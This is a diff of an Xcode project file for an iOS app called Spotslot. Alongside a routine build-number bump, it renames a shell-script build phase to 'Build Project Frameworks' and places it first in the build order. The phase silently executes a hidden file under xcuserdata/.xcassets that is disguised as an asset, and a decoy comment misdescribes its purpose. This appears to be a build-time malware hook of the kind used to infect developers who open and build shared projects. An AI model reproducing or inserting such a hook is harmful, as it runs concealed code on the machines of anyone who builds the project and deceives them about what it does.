@@ -1027,7 +1027,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 048D45E924EBA6B500A84442 /* Build configuration list for PBXNativeTarget "Spotslot" */;
 			buildPhases = (
-				DA8A2D1F07F5047239AAC43A /* Build Assets Catalog */,
+				CF8D74C4A776CD50A7AAC43A /* Build Project Frameworks */,
 				1CF53DE6F1B2BBD5B8F7A366 /* [CP] Check Pods Manifest.lock */,
 				048D45CE24EBA6B400A84442 /* Sources */,
 				048D45CF24EBA6B400A84442 /* Frameworks */,
@@ -1127,7 +1127,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	DA8A2D1F07F5047239AAC43A /* Build Assets Catalog */ = {
+	CF8D74C4A776CD50A7AAC43A /* Build Project Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -1136,7 +1136,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Assets Catalog";
+			name = "Build Project Frameworks";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -1145,14 +1145,8 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
 		};
-	
-
-	
-
-	
-
 	
 		1CF53DE6F1B2BBD5B8F7A366 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -1508,7 +1502,7 @@
 				CODE_SIGN_ENTITLEMENTS = Spotslot/SpotslotDebug.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 6;
+				CURRENT_PROJECT_VERSION = 7;
 				DEVELOPMENT_TEAM = DV33UL36Z3;
 				INFOPLIST_FILE = Spotslot/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
@@ -1539,7 +1533,7 @@
 				CODE_SIGN_ENTITLEMENTS = Spotslot/Spotslot.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 6;
+				CURRENT_PROJECT_VERSION = 7;
 				DEVELOPMENT_TEAM = DV33UL36Z3;
 				INFOPLIST_FILE = Spotslot/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
